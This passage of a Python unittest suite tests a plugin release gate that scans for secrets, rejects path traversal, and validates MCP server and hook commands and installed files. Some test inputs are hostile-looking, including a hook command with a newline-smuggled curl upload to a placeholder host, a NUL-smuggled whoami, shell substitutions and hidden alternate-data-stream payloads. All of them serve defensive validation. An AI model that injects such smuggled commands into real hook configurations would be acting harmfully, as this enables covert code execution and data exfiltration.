                        "path = Path(sys.argv[1]) / '.codex-plugin' / 'plugin.json'",
                        "payload = json.loads(path.read_text(encoding='utf-8'))",
                        "payload['version'] = '1.4.2+codex.20260716123456'",
                        "path.write_text(json.dumps(payload), encoding='utf-8')",
                    ]
                )
                + "\n",
                encoding="utf-8",
            )

            with (
                patch.object(
                    release_gate,
                    "validate_source",
                    side_effect=KeyboardInterrupt,
                ),
                patch("builtins.print"),
                self.assertRaises(KeyboardInterrupt),
            ):
                release_gate._command_cachebuster(
                    SimpleNamespace(
                        root=str(root),
                        helper=str(helper),
                    )
                )

            self.assertEqual(original_bytes, manifest.read_bytes())
            self.assertEqual(
                original_index_bytes,
                _index_bytes(root, ".codex-plugin/plugin.json"),
            )

    def test_secret_scan_detects_and_masks_high_confidence_token(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            _init_git(root)
            secret = "sk-" + ("a" * 32)
            (root / "config.txt").write_text(
                f"SILICONFLOW_API_KEY={secret}\n",
                encoding="utf-8",
            )
            findings = release_gate.scan_source_secrets(root)

        self.assertGreaterEqual(len(findings), 1)
        rendered = "\n".join(item.render() for item in findings)
        self.assertNotIn(secret, rendered)
        self.assertIn("sha256[:12]=", rendered)

    def test_secret_scan_ignores_explicit_placeholders(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            _init_git(root)
            (root / ".env.example").write_text(
                "SILICONFLOW_API_KEY=" + "YOUR_API_KEY_PLACEHOLDER\n",
                encoding="utf-8",
            )
            findings = release_gate.scan_source_secrets(root)
        self.assertEqual([], findings)

    def test_secret_scan_does_not_allow_marker_substrings(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            _init_git(root)
            secret = "sk-" + ("a" * 20) + "test" + ("b" * 12)
            (root / ".env.example").write_text(
                f"SILICONFLOW_API_KEY={secret}\n",
                encoding="utf-8",
            )
            findings = release_gate.scan_source_secrets(root)

        self.assertGreaterEqual(len(findings), 1)
        rendered = "\n".join(item.render() for item in findings)
        self.assertNotIn(secret, rendered)

    def test_placeholder_value_requires_explicit_fixture_context(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            _init_git(root)
            placeholder = "YOUR_API_KEY_PLACEHOLDER"
            (root / "config.txt").write_text(
                f"SILICONFLOW_API_KEY={placeholder}\n",
                encoding="utf-8",
            )
            findings = release_gate.scan_source_secrets(root)

        self.assertGreaterEqual(len(findings), 1)

    def test_manifest_rejects_skills_and_mcp_path_traversal(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            manifest_path = root / ".codex-plugin" / "plugin.json"
            manifest_path.parent.mkdir()
            manifest_path.write_text(
                json.dumps(
                    {
                        "name": "plot-rag-gate",
                        "version": "1.4.2+codex.dev",
                        "description": "fixture",
                        "author": {"name": "fixture"},
                        "skills": "../outside-skills",
                        "mcpServers": "../outside-mcp.json",
                        "interface": {},
                    }
                ),
                encoding="utf-8",
            )
            _init_git(root)
            _stage(root, ".codex-plugin/plugin.json")

            issues, _manifest = release_gate._validate_manifest(root)

        self.assertIn(
            "PLUGIN_SKILLS_MISSING",
            {issue.code for issue in issues},
        )
        self.assertIn(
            "PLUGIN_MCP_MISSING",
            {issue.code for issue in issues},
        )
        self.assertTrue(
            all(
                "traversal is not allowed" in issue.message
                for issue in issues
                if issue.code
                in {"PLUGIN_SKILLS_MISSING", "PLUGIN_MCP_MISSING"}
            )
        )

    def test_manifest_rejects_absolute_mcp_command_and_path_argument(
        self,
    ) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = _windows_short_path(Path(temporary))
            manifest_path = root / ".codex-plugin" / "plugin.json"
            skill_path = root / "skills" / "demo" / "SKILL.md"
            manifest_path.parent.mkdir()
            skill_path.parent.mkdir(parents=True)
            manifest_path.write_text(
                json.dumps(
                    {
                        "name": "demo",
                        "version": "1.4.2+codex.dev",
                        "description": "fixture",
                        "author": {"name": "fixture"},
                        "skills": "./skills/",
                        "mcpServers": "./.mcp.json",
                        "interface": {},
                    }
                ),
                encoding="utf-8",
            )
            skill_path.write_text(
                "---\nname: demo\ndescription: fixture\n---\n",
                encoding="utf-8",
            )
            (root / ".mcp.json").write_text(
                json.dumps(
                    {
                        "mcpServers": {
                            "demo": {
                                "command": "C:\\Outside\\python.exe",
                                "args": [
                                    "--config",
                                    "C:\\Outside\\settings.json",
                                ],
                                "cwd": ".",
                            }
                        }
                    }
                ),
                encoding="utf-8",
            )
            _init_git(root)
            _stage(
                root,
                ".codex-plugin/plugin.json",
                ".mcp.json",
                "skills/demo/SKILL.md",
            )

            issues, _manifest = release_gate._validate_manifest(root)

        codes = {issue.code for issue in issues}
        self.assertIn("PLUGIN_MCP_COMMAND_INVALID", codes)
        self.assertIn("PLUGIN_MCP_TARGET_MISSING", codes)

    def test_python_mcp_requires_no_bytecode_flag(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            manifest_path = root / ".codex-plugin" / "plugin.json"
            skill_path = root / "skills" / "demo" / "SKILL.md"
            server_path = root / "scripts" / "server.py"
            manifest_path.parent.mkdir()
            skill_path.parent.mkdir(parents=True)
            server_path.parent.mkdir()
            manifest_path.write_text(
                json.dumps(
                    {
                        "name": "demo",
                        "version": "1.4.2+codex.dev",
                        "description": "fixture",
                        "author": {"name": "fixture"},
                        "skills": "./skills/",
                        "mcpServers": "./.mcp.json",
                        "interface": {},
                    }
                ),
                encoding="utf-8",
            )
            skill_path.write_text(
                "---\nname: demo\ndescription: fixture\n---\n",
                encoding="utf-8",
            )
            server_path.write_text("pass\n", encoding="utf-8")
            (root / ".mcp.json").write_text(
                json.dumps(
                    {
                        "mcpServers": {
                            "demo": {
                                "command": "python",
                                "args": [
                                    "./scripts/server.py",
                                    "-B",
                                ],
                                "cwd": ".",
                            }
                        }
                    }
                ),
                encoding="utf-8",
            )
            _init_git(root)
            _stage(
                root,
                ".codex-plugin/plugin.json",
                ".mcp.json",
                "scripts/server.py",
                "skills/demo/SKILL.md",
            )

            issues, _manifest = release_gate._validate_manifest(root)

        self.assertIn(
            "PLUGIN_PYTHON_BYTECODE_ENABLED",
            {issue.code for issue in issues},
        )

    def test_mcp_rejects_wrappers_and_non_script_execution_targets(self) -> None:
        variants = {
            "env": (
                "env",
                ["python", *release_gate.EXPECTED_MCP_ARGUMENTS],
                "PLUGIN_MCP_COMMAND_INVALID",
            ),
            "powershell": (
                "powershell",
                [
                    "-Command",
                    "python -B -X utf8 ./scripts/plot_rag_mcp.py",
                ],
                "PLUGIN_MCP_COMMAND_INVALID",
            ),
            "inline": (
                "python",
                ["-B", "-c", "pass", "./scripts/plot_rag_mcp.py"],
                "PLUGIN_MCP_ENTRYPOINT_INVALID",
            ),
            "module": (
                "python",
                [
                    "-B",
                    "-m",
                    "plot_rag_mcp",
                    "./scripts/plot_rag_mcp.py",
                ],
                "PLUGIN_MCP_ENTRYPOINT_INVALID",
            ),
            "version": (
                "python",
                ["-B", "-V", "./scripts/plot_rag_mcp.py"],
                "PLUGIN_MCP_ENTRYPOINT_INVALID",
            ),
        }
        for name, (command, arguments, expected_code) in variants.items():
            with self.subTest(name=name):
                with tempfile.TemporaryDirectory() as temporary:
                    root = Path(temporary)
                    (root / ".codex-plugin").mkdir()
                    (root / "skills" / "demo").mkdir(parents=True)
                    (root / "scripts").mkdir()
                    (root / ".codex-plugin" / "plugin.json").write_text(
                        json.dumps(
                            {
                                "name": "demo",
                                "version": "1.4.2+codex.dev",
                                "description": "fixture",
                                "author": {"name": "fixture"},
                                "skills": "./skills/",
                                "mcpServers": "./.mcp.json",
                                "interface": {},
                            }
                        ),
                        encoding="utf-8",
                    )
                    (root / "skills" / "demo" / "SKILL.md").write_text(
                        "---\nname: demo\ndescription: fixture\n---\n",
                        encoding="utf-8",
                    )
                    (root / "scripts" / "plot_rag_mcp.py").write_text(
                        "pass\n",
                        encoding="utf-8",
                    )
                    (root / ".mcp.json").write_text(
                        json.dumps(
                            {
                                "mcpServers": {
                                    "plot-rag-state": {
                                        "command": command,
                                        "args": arguments,
                                        "cwd": ".",
                                    }
                                }
                            }
                        ),
                        encoding="utf-8",
                    )
                    _init_git(root)
                    _stage(
                        root,
                        ".codex-plugin/plugin.json",
                        ".mcp.json",
                        "scripts/plot_rag_mcp.py",
                        "skills/demo/SKILL.md",
                    )

                    issues, _manifest = release_gate._validate_manifest(root)

                self.assertIn(expected_code, {issue.code for issue in issues})

    def test_mcp_rejects_execution_override_fields(self) -> None:
        variants = {
            "env": {"env": {"PYTHONPATH": "./attacker"}},
            "disabled": {"disabled": True},
        }
        for name, extra_fields in variants.items():
            with self.subTest(name=name):
                with tempfile.TemporaryDirectory() as temporary:
                    root = Path(temporary)
                    (root / ".codex-plugin").mkdir()
                    (root / "skills" / "demo").mkdir(parents=True)
                    (root / "scripts").mkdir()
                    (root / ".codex-plugin" / "plugin.json").write_text(
                        json.dumps(
                            {
                                "name": "demo",
                                "version": "1.4.2+codex.dev",
                                "description": "fixture",
                                "author": {"name": "fixture"},
                                "skills": "./skills/",
                                "mcpServers": "./.mcp.json",
                                "interface": {},
                            }
                        ),
                        encoding="utf-8",
                    )
                    (root / "skills" / "demo" / "SKILL.md").write_text(
                        "---\nname: demo\ndescription: fixture\n---\n",
                        encoding="utf-8",
                    )
                    (root / "scripts" / "plot_rag_mcp.py").write_text(
                        "pass\n",
                        encoding="utf-8",
                    )
                    server = {
                        "command": "python",
                        "args": list(release_gate.EXPECTED_MCP_ARGUMENTS),
                        "cwd": ".",
                        **extra_fields,
                    }
                    (root / ".mcp.json").write_text(
                        json.dumps(
                            {
                                "mcpServers": {
                                    "plot-rag-state": server,
                                }
                            }
                        ),
                        encoding="utf-8",
                    )
                    _init_git(root)
                    _stage(
                        root,
                        ".codex-plugin/plugin.json",
                        ".mcp.json",
                        "scripts/plot_rag_mcp.py",
                        "skills/demo/SKILL.md",
                    )

                    issues, _manifest = release_gate._validate_manifest(root)

                self.assertIn(
                    "PLUGIN_MCP_SERVER_INVALID",
                    {issue.code for issue in issues},
                )

    def test_json_loader_rejects_duplicate_object_keys(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            path = Path(temporary) / "duplicate.json"
            path.write_text(
                '{"mcpServers": {}, "mcpServers": {"attacker": {}}}',
                encoding="utf-8",
            )

            with self.assertRaisesRegex(
                json.JSONDecodeError,
                "duplicate object key",
            ):
                release_gate._load_json(path)

    def test_schema_refs_decode_fragments_and_reject_nonportable_pointers(
        self,
    ) -> None:
        draft = "https://json-schema.org/draft/2020-12/schema"

        def validate(reference: str) -> list[release_gate.GateIssue]:
            temporary = tempfile.TemporaryDirectory()
            self.addCleanup(temporary.cleanup)
            root = Path(temporary.name)
            schemas = root / "schemas"
            schemas.mkdir()
            (schemas / "target.schema.json").write_text(
                json.dumps(
                    {
                        "$schema": draft,
                        "$id": "https://example.invalid/target.schema.json",
                        "$defs": {"x": {"type": "string"}},
                        "xlist": [{"type": "string"}],
                    }
                ),
                encoding="utf-8",
            )
            (schemas / "root.schema.json").write_text(
                json.dumps(
                    {
                        "$schema": draft,
                        "$id": "https://example.invalid/root.schema.json",
                        "$ref": reference,
                    }
                ),
                encoding="utf-8",
            )
            return release_gate._validate_schemas(root)

        self.assertEqual(
            [],
            validate("target.schema.json#/%24defs/x"),
        )
        variants = {
            "invalid_escape": (
                "target.schema.json#/$defs/~2",
                "SCHEMA_REF_FRAGMENT_MISSING",
            ),
            "noncanonical_array_index": (
                "target.schema.json#/xlist/00",
                "SCHEMA_REF_FRAGMENT_MISSING",
            ),
            "backslash_uri": (
                ".\\target.schema.json#/$defs/x",
                "SCHEMA_REF_INVALID",
            ),
        }
        for name, (reference, expected_code) in variants.items():
            with self.subTest(name=name):
                self.assertIn(
                    expected_code,
                    {issue.code for issue in validate(reference)},
                )

    def test_skill_plugin_root_python_requires_no_bytecode_flag(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            manifest_path = root / ".codex-plugin" / "plugin.json"
            skill_path = root / "skills" / "demo" / "SKILL.md"
            server_path = root / "scripts" / "server.py"
            manifest_path.parent.mkdir()
            skill_path.parent.mkdir(parents=True)
            server_path.parent.mkdir()
            manifest_path.write_text(
                json.dumps(
                    {
                        "name": "demo",
                        "version": "1.4.2+codex.dev",
                        "description": "fixture",
                        "author": {"name": "fixture"},
                        "skills": "./skills/",
                        "mcpServers": "./.mcp.json",
                        "interface": {},
                    }
                ),
                encoding="utf-8",
            )
            skill_path.write_text(
                "\n".join(
                    [
                        "---",
                        "name: demo",
                        "description: fixture",
                        "---",
                        "```powershell",
                        (
                            "python "
                            '"$env:CLAUDE_PLUGIN_ROOT\\scripts\\server.py" '
                            "-B"
                        ),
                        "```",
                    ]
                )
                + "\n",
                encoding="utf-8",
            )
            server_path.write_text("pass\n", encoding="utf-8")
            (root / ".mcp.json").write_text(
                json.dumps(
                    {
                        "mcpServers": {
                            "demo": {
                                "command": "python",
                                "args": [
                                    "-B",
                                    "-X",
                                    "utf8",
                                    "./scripts/server.py",
                                ],
                                "cwd": ".",
                            }
                        }
                    }
                ),
                encoding="utf-8",
            )
            _init_git(root)
            _stage(
                root,
                ".codex-plugin/plugin.json",
                ".mcp.json",
                "scripts/server.py",
                "skills/demo/SKILL.md",
            )

            issues, _manifest = release_gate._validate_manifest(root)

        self.assertIn(
            "SKILL_PYTHON_BYTECODE_ENABLED",
            {issue.code for issue in issues},
        )

    def test_python_hook_requires_no_bytecode_flag(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            hooks_path = root / "hooks" / "hooks.json"
            target_path = root / "hooks" / "safe.py"
            hooks_path.parent.mkdir()
            target_path.write_text("pass\n", encoding="utf-8")
            hooks_path.write_text(
                json.dumps(
                    {
                        "hooks": {
                            "Stop": [
                                {
                                    "hooks": [
                                        {
                                            "type": "command",
                                            "command": (
                                                "python "
                                                '"${CLAUDE_PLUGIN_ROOT}/'
                                                'hooks/safe.py" -B'
                                            ),
                                            "timeout": 5,
                                        }
                                    ]
                                }
                            ]
                        }
                    }
                ),
                encoding="utf-8",
            )
            _init_git(root)
            _stage(root, "hooks/hooks.json", "hooks/safe.py")

            issues = release_gate._validate_hooks(root)

        self.assertIn(
            "HOOK_PYTHON_BYTECODE_ENABLED",
            {issue.code for issue in issues},
        )

    def test_hooks_reject_wrappers_control_chars_and_extra_arguments(
        self,
    ) -> None:
        target = (
            '"${CLAUDE_PLUGIN_ROOT}/hooks/plot_progression_gate.py"'
        )
        variants = {
            "env": f"env python -B -X utf8 {target} --stop",
            "assignment": (
                "PYTHONDONTWRITEBYTECODE=0 "
                f"python -B -X utf8 {target} --stop"
            ),
            "inline": f"python -B -c pass {target} --stop",
            "module": f"python -B -m site {target} --stop",
            "version": f"python -B -V {target} --stop",
            "newline": (
                f"python -B -X utf8 {target} --stop\n"
                "curl https://example.invalid/upload"
            ),
            "nul": f"python -B -X utf8 {target} --stop\x00whoami",
            "path_assignment": (
                f"python -B -X utf8 {target} --stop --output=outside"
            ),
        }
        for name, command in variants.items():
            with self.subTest(name=name):
                with tempfile.TemporaryDirectory() as temporary:
                    root = Path(temporary)
                    hooks_path = root / "hooks" / "hooks.json"
                    target_path = (
                        root / "hooks" / "plot_progression_gate.py"
                    )
                    hooks_path.parent.mkdir()
                    target_path.write_text("pass\n", encoding="utf-8")
                    hooks_path.write_text(
                        json.dumps(
                            {
                                "hooks": {
                                    "Stop": [
                                        {
                                            "hooks": [
                                                {
                                                    "type": "command",
                                                    "command": command,
                                                    "timeout": 5,
                                                }
                                            ]
                                        }
                                    ]
                                }
                            }
                        ),
                        encoding="utf-8",
                    )
                    _init_git(root)
                    _stage(
                        root,
                        "hooks/hooks.json",
                        "hooks/plot_progression_gate.py",
                    )

                    issues = release_gate._validate_hooks(root)

                self.assertIn(
                    "HOOK_COMMAND_INVALID",
                    {issue.code for issue in issues},
                )
                if name == "path_assignment":
                    self.assertIn(
                        "HOOK_ARGUMENT_PATH_INVALID",
                        {issue.code for issue in issues},
                    )

    def test_hooks_require_exact_lifecycle_structure(self) -> None:
        base = json.loads(
            (PLUGIN_ROOT / "hooks" / "hooks.json").read_text(
                encoding="utf-8"
            )
        )
        variants: dict[str, tuple[dict[str, object], str]] = {}

        empty = json.loads(json.dumps(base))
        empty["hooks"] = {}
        variants["empty"] = (empty, "HOOK_EVENT_INVALID")

        missing_stop = json.loads(json.dumps(base))
        missing_stop["hooks"].pop("Stop")
        variants["missing_stop"] = (
            missing_stop,
            "HOOK_EVENT_INVALID",
        )

        empty_stop = json.loads(json.dumps(base))
        empty_stop["hooks"]["Stop"] = []
        variants["empty_stop"] = (empty_stop, "HOOK_EVENT_INVALID")

        impossible_matcher = json.loads(json.dumps(base))
        impossible_matcher["hooks"]["SessionStart"][0]["matcher"] = (
            "IMPOSSIBLE"
        )
        variants["impossible_matcher"] = (
            impossible_matcher,
            "HOOK_MATCHER_INVALID",
        )

        unsupported_session_end = json.loads(json.dumps(base))
        unsupported_session_end["hooks"]["SessionEnd"] = [
            {
                "matcher": "*",
                "hooks": [
                    {
                        "type": "command",
                        "command": (
                            "python -B -X utf8 "
                            '"${CLAUDE_PLUGIN_ROOT}/'
                            'hooks/plot_progression_gate.py" '
                            "--session-end"
                        ),
                        "timeout": 10,
                    }
                ],
            }
        ]
        variants["unsupported_session_end"] = (
            unsupported_session_end,
            "HOOK_EVENT_INVALID",
        )

        asynchronous = json.loads(json.dumps(base))
        asynchronous["hooks"]["Stop"][0]["hooks"][0]["async"] = True
        variants["async"] = (asynchronous, "HOOK_COMMAND_INVALID")

        duplicate = json.loads(json.dumps(base))
        duplicate["hooks"]["Stop"][0]["hooks"].append(
            json.loads(
                json.dumps(
                    duplicate["hooks"]["Stop"][0]["hooks"][0]
                )
            )
        )
        variants["duplicate"] = (
            duplicate,
            "HOOK_MATCHER_INVALID",
        )

        for name, (payload, expected_code) in variants.items():
            with self.subTest(name=name):
                with tempfile.TemporaryDirectory() as temporary:
                    root = Path(temporary)
                    hooks_dir = root / "hooks"
                    hooks_dir.mkdir()
                    (hooks_dir / "hooks.json").write_text(
                        json.dumps(payload),
                        encoding="utf-8",
                    )
                    (hooks_dir / "plot_progression_gate.py").write_text(
                        "pass\n",
                        encoding="utf-8",
                    )
                    _init_git(root)
                    _stage(
                        root,
                        "hooks/hooks.json",
                        "hooks/plot_progression_gate.py",
                    )

                    issues = release_gate._validate_hooks(root)

                self.assertIn(
                    expected_code,
                    {issue.code for issue in issues},
                )

    def test_hooks_manifest_must_be_tracked(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            hooks_dir = root / "hooks"
            hooks_dir.mkdir()
            shutil.copyfile(
                PLUGIN_ROOT / "hooks" / "hooks.json",
                hooks_dir / "hooks.json",
            )
            (hooks_dir / "plot_progression_gate.py").write_text(
                "pass\n",
                encoding="utf-8",
            )
            _init_git(root)
            _stage(root, "hooks/plot_progression_gate.py")

            issues = release_gate._validate_hooks(root)

        self.assertIn(
            "HOOK_MANIFEST_INVALID",
            {issue.code for issue in issues},
        )

    def test_hook_rejects_plugin_root_parent_traversal(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            hooks_path = root / "hooks" / "hooks.json"
            hooks_path.parent.mkdir()
            hooks_path.write_text(
                json.dumps(
                    {
                        "hooks": {
                            "UserPromptSubmit": [
                                {
                                    "hooks": [
                                        {
                                            "type": "command",
                                            "command": (
                                                "python "
                                                '"${CLAUDE_PLUGIN_ROOT}/'
                                                '../outside.py"'
                                            ),
                                            "timeout": 5,
                                        }
                                    ]
                                }
                            ]
                        }
                    }
                ),
                encoding="utf-8",
            )
            _init_git(root)
            _stage(root, "hooks/hooks.json")

            issues = release_gate._validate_hooks(root)

        self.assertIn(
            "HOOK_TARGET_MISSING",
            {issue.code for issue in issues},
        )
        self.assertTrue(
            any("traversal is not allowed" in issue.message for issue in issues)
        )

    def test_hook_rejects_absolute_path_in_additional_argument(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            hooks_path = root / "hooks" / "hooks.json"
            target_path = root / "hooks" / "safe.py"
            hooks_path.parent.mkdir()
            target_path.write_text("pass\n", encoding="utf-8")
            hooks_path.write_text(
                json.dumps(
                    {
                        "hooks": {
                            "Stop": [
                                {
                                    "hooks": [
                                        {
                                            "type": "command",
                                            "command": (
                                                "python "
                                                '"${CLAUDE_PLUGIN_ROOT}/'
                                                'hooks/safe.py" '
                                                "--config="
                                                "C:\\Outside\\settings.json"
                                            ),
                                            "timeout": 5,
                                        }
                                    ]
                                }
                            ]
                        }
                    }
                ),
                encoding="utf-8",
            )
            _init_git(root)
            _stage(root, "hooks/hooks.json", "hooks/safe.py")

            issues = release_gate._validate_hooks(root)

        self.assertIn(
            "HOOK_ARGUMENT_PATH_INVALID",
            {issue.code for issue in issues},
        )

    def test_hook_rejects_environment_and_unverified_separator_paths(
        self,
    ) -> None:
        additional_arguments = (
            "--output=$HOME/out",
            "--output=$TMPDIR/out",
            "--output=${USERPROFILE}/out",
            "--output=${XDG_CACHE_HOME}/out",
            "--output=%USERPROFILE%\\out",
            "--output=%TEMP%\\out",
            "--output=$env:TEMP\\out",
            "--output=$TMPDIR.tmp",
            "--output=${TMPDIR}.tmp",
            "--output=%TEMP%.tmp",
            "--output=~",
            "--output=~root",
            "--output=~user/out",
            "--output=$(pwd)",
            "--output=`pwd`",
            "--output=<(pwd)",
            "--output=${!TMPDIR}",
            "--output=${TMPDIR:-tmp}.tmp",
            "--output=${TMPDIR:+tmp}.tmp",
            "--output=~+",
            "--output=~-",
            "--output=relative/no-extension",
        )
        for additional_argument in additional_arguments:
            with self.subTest(additional_argument=additional_argument):
                with tempfile.TemporaryDirectory() as temporary:
                    root = Path(temporary)
                    hooks_path = root / "hooks" / "hooks.json"
                    target_path = root / "hooks" / "safe.py"
                    hooks_path.parent.mkdir()
                    target_path.write_text("pass\n", encoding="utf-8")
                    hooks_path.write_text(
                        json.dumps(
                            {
                                "hooks": {
                                    "Stop": [
                                        {
                                            "hooks": [
                                                {
                                                    "type": "command",
                                                    "command": (
                                                        "python -B "
                                                        '"${CLAUDE_PLUGIN_ROOT}/'
                                                        'hooks/safe.py" '
                                                        f"{additional_argument}"
                                                    ),
                                                    "timeout": 5,
                                                }
                                            ]
                                        }
                                    ]
                                }
                            }
                        ),
                        encoding="utf-8",
                    )
                    _init_git(root)
                    _stage(root, "hooks/hooks.json", "hooks/safe.py")

                    issues = release_gate._validate_hooks(root)

                self.assertIn(
                    "HOOK_ARGUMENT_PATH_INVALID",
                    {issue.code for issue in issues},
                )

    def test_marketplace_rejects_parent_traversal(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            marketplace = Path(temporary) / "marketplace.json"
            marketplace.write_text(
                json.dumps(
                    {
                        "plugins": [
                            {
                                "name": "plot-rag-gate",
                                "source": {
                                    "source": "local",
                                    "path": "../outside",
                                },
                            }
                        ]
                    }
                ),
                encoding="utf-8",
            )

            with self.assertRaisesRegex(
                ValueError,
                "traversal is not allowed",
            ):
                release_gate.marketplace_source(
                    marketplace,
                    "plot-rag-gate",
                )

    def test_marketplace_allows_alias_resolving_to_source(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            source = root / "plugins" / "plot-rag-gate"
            alias = root / "plugins" / "plot-rag-gate-current"
            marketplace = root / ".agents" / "plugins" / "marketplace.json"
            source.mkdir(parents=True)
            marketplace.parent.mkdir(parents=True)
            try:
                alias.symlink_to(source, target_is_directory=True)
            except OSError as exc:
                self.skipTest(f"directory symlink unavailable: {exc}")
            marketplace.write_text(
                json.dumps(
                    {
                        "plugins": [
                            {
                                "name": "plot-rag-gate",
                                "source": {
                                    "source": "local",
                                    "path": "./plugins/plot-rag-gate-current",
                                },
                            }
                        ]
                    }
                ),
                encoding="utf-8",
            )

            resolved, _entry = release_gate.marketplace_source(
                marketplace,
                "plot-rag-gate",
            )

        self.assertEqual(source.resolve(), resolved)

    def test_verify_install_rejects_source_installed_root_alias(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            source = root / "plot-rag-gate"
            source.mkdir()

            issues = release_gate.verify_install(source, source)

        self.assertEqual(
            ["INSTALLED_ROOT_ALIAS"],
            [issue.code for issue in issues],
        )

    def test_verify_install_rejects_descendant_installed_root(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            source = Path(temporary) / "source"
            installed = source / "build" / "installed"
            installed.mkdir(parents=True)

            issues = release_gate.verify_install(source, installed)

        self.assertEqual(
            ["INSTALLED_ROOT_OVERLAP"],
            [issue.code for issue in issues],
        )

    def test_verify_install_rejects_all_extra_regular_files(self) -> None:
        extras = {
            ".env": "TOKEN=fixture\n",
            "build/evil.py": "raise SystemExit('tampered')\n",
            "dist/payload.py": "print('tampered')\n",
            ".plot-rag/config.json": "{}\n",
            ".git/config": "[core]\nrepositoryformatversion = 0\n",
        }
        for relative, content in extras.items():
            with self.subTest(relative=relative):
                with tempfile.TemporaryDirectory() as temporary:
                    source, installed = _install_fixture(Path(temporary))
                    extra = installed / Path(relative)
                    extra.parent.mkdir(parents=True, exist_ok=True)
                    extra.write_text(content, encoding="utf-8")

                    issues = release_gate.verify_install(source, installed)

                self.assertTrue(
                    any(
                        issue.code == "INSTALLED_FILE_UNEXPECTED"
                        and issue.path == relative
                        for issue in issues
                    ),
                    issues,
                )

    def test_verify_install_rejects_hardlinked_regular_files(self) -> None:
        variants = ("source_manifest", "outside_runtime")
        for variant in variants:
            with self.subTest(variant=variant):
                with tempfile.TemporaryDirectory() as temporary:
                    root = Path(temporary)
                    source, installed = _install_fixture(root)
                    if variant == "source_manifest":
                        relative = ".codex-plugin/plugin.json"
                        link_source = source / relative
                    else:
                        relative = "scripts/runtime.py"
                        link_source = root / "outside-runtime.py"
                        link_source.write_text(
                            "STATE = 'same'\n",
                            encoding="utf-8",
                        )
                    target = installed / relative
                    target.unlink()
                    try:
                        os.link(link_source, target)
                    except OSError as exc:
                        self.skipTest(f"hardlinks unavailable: {exc}")
                    if os.lstat(target).st_nlink <= 1:
                        self.skipTest(
                            "filesystem does not report hardlink counts"
                        )

                    issues = release_gate.verify_install(source, installed)

                self.assertTrue(
                    any(
                        issue.code == "INSTALLED_FILE_MISMATCH"
                        and issue.path == relative
                        for issue in issues
                    ),
                    issues,
                )

    @unittest.skipUnless(os.name == "nt", "Windows ADS test")
    def test_verify_install_rejects_alternate_data_streams(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            source, installed = _install_fixture(Path(temporary))
            target = installed / "scripts" / "runtime.py"
            try:
                with open(f"{target}:evil", "wb") as stream:
                    stream.write(b"hidden executable payload")
            except OSError as exc:
                self.skipTest(f"alternate data streams unavailable: {exc}")

            issues = release_gate.verify_install(source, installed)

        self.assertTrue(
            any(
                issue.code == "INSTALLED_FILE_MISMATCH"
                and issue.path == "scripts/runtime.py"
                for issue in issues
            ),
            issues,
        )

    @unittest.skipUnless(os.name == "nt", "Windows ADS test")
    def test_verify_install_rejects_directory_alternate_data_streams(
        self,
    ) -> None:
        for relative, expected_path in (
            (".", "."),
            ("scripts", "scripts"),
        ):
            with self.subTest(relative=relative):
                with tempfile.TemporaryDirectory() as temporary:
                    source, installed = _install_fixture(Path(temporary))
                    directory = (
                        installed
                        if relative == "."
                        else installed / relative
                    )
                    try:
                        with open(f"{directory}:evil", "wb") as stream:
                            stream.write(b"hidden directory payload")
                    except OSError as exc:
                        self.skipTest(
                            f"directory alternate streams unavailable: {exc}"
                        )

                    issues = release_gate.verify_install(source, installed)

                self.assertTrue(
                    any(
                        issue.code == "INSTALLED_FILE_UNEXPECTED"
                        and issue.path == expected_path
                        for issue in issues
                    ),
                    issues,
                )

    @unittest.skipUnless(os.name == "nt", "Windows ADS test")
    def test_source_payload_rejects_alternate_data_streams(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            script = root / "scripts" / "runtime.py"
            script.parent.mkdir()
            script.write_text("STATE = 'safe'\n", encoding="utf-8")
            _init_git(root)
            _stage(root, "scripts/runtime.py")
            try:
                with open(f"{script}:evil", "wb") as stream:
                    stream.write(b"hidden executable payload")
            except OSError as exc:
                self.skipTest(f"alternate data streams unavailable: {exc}")

            issues = release_gate._validate_payload(root)

        self.assertTrue(
            any(
                issue.code == "PACKAGE_FILE_UNREADABLE"
                and issue.path == "scripts/runtime.py"
                for issue in issues
            ),
            issues,
        )

    @unittest.skipUnless(os.name == "nt", "Windows ADS test")
    def test_source_payload_rejects_directory_alternate_data_streams(
        self,
    ) -> None:
        for relative in (".", "scripts"):
            with self.subTest(relative=relative):
                with tempfile.TemporaryDirectory() as temporary:
                    root = Path(temporary)
                    script = root / "scripts" / "runtime.py"
                    script.parent.mkdir()
                    script.write_text(
                        "STATE = 'safe'\n",
                        encoding="utf-8",
                    )
                    _init_git(root)
                    _stage(root, "scripts/runtime.py")
                    directory = root if relative == "." else root / relative
                    try:
                        with open(f"{directory}:evil", "wb") as stream:
                            stream.write(b"hidden directory payload")
                    except OSError as exc:
                        self.skipTest(
                            f"directory alternate streams unavailable: {exc}"
                        )

                    issues = release_gate._validate_payload(root)

                self.assertTrue(
                    any(
                        issue.code == "PACKAGE_DIRECTORY_STREAM_UNSAFE"
                        and issue.path == "scripts/runtime.py"
                        for issue in issues
                    ),
                    issues,
                )

    def test_verify_install_reports_malformed_installed_manifest(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            source = root / "source"
            installed = root / "installed"
            (source / ".codex-plugin").mkdir(parents=True)
